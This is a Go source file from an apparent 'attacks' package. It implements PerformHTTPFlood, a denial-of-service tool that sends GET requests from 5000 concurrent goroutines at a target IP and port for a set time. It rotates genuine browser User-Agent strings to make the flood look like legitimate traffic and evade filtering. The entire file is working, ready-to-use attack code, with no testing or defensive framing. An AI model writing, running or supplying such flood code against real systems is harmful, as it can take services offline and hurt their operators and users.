package attacks

import (
    "context"
    "fmt"
    "math/rand"
    "net"
    "net/http"
    "sync"
    "sync/atomic"
    "time"
)

// List of legitimate user agents
var userAgents = []string{
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15A372 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; SM-G973U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.185 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
}

// PerformHTTPFlood sends a large number of HTTP GET requests to the target URL and targetPort.
func PerformHTTPFlood(targetIP string, targetPort int, duration int) error {
    rand.Seed(time.Now().UnixNano())

    var requestCount int64
    var wg sync.WaitGroup
    const maxConcurrentRequests = 5000 // Increased number of concurrent requests
    sem := make(chan struct{}, maxConcurrentRequests)

    // Create a context with cancellation to signal the end of the attack
    ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
    defer cancel()

    // Construct the full target URL with the specified targetPort
    fullTargetIP := fmt.Sprintf("http://%s:%d", targetIP, targetPort)

    // Create a single HTTP client instance with a timeout and connection reuse
    client := &http.Client{
        Timeout: 5 * time.Second, // Increased timeout
        Transport: &http.Transport{
            DialContext: (&net.Dialer{
                Timeout:   3 * time.Second, // Increased dial timeout
                KeepAlive: 30 * time.Second,
            }).DialContext,
            MaxIdleConns:        maxConcurrentRequests,
            IdleConnTimeout:     120 * time.Second, // Increased idle connection timeout
            MaxConnsPerHost:     maxConcurrentRequests,
            MaxIdleConnsPerHost: maxConcurrentRequests,
            TLSHandshakeTimeout: 10 * time.Second,
        },
    }

    // Launch multiple goroutines to send HTTP requests concurrently
    for i := 0; i < maxConcurrentRequests; i++ {
        wg.Add(1)
        go func() {
            defer wg.Done()

            for {
                select {
                case <-ctx.Done():
                    return // Terminate goroutine if context is canceled
                default:
                    sem <- struct{}{} // Acquire a semaphore slot

                    // Create a new HTTP request
                    req, err := http.NewRequest("GET", fullTargetIP, nil)
                    if err != nil {
                        fmt.Printf("Error creating request: %v\n", err)
                        <-sem // Release semaphore slot
                        continue
                    }

                    // Add random User-Agent headers to mimic legitimate traffic
                    req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])

                    // Send the HTTP request
                    resp, err := client.Do(req)
                    if err != nil {
                        fmt.Printf("Error sending request: %v\n", err)
                        <-sem // Release semaphore slot
                        continue
                    }
                    resp.Body.Close() // Close the response body

                    // Increment the request count atomically
                    atomic.AddInt64(&requestCount, 1)

                    <-sem // Release semaphore slot
                }
            }
        }()
    }

    // Wait for all goroutines to finish or until the context is canceled
    wg.Wait()

    fmt.Printf("HTTP flood attack completed. Sent %d requests.\n", atomic.LoadInt64(&requestCount))
    return nil
}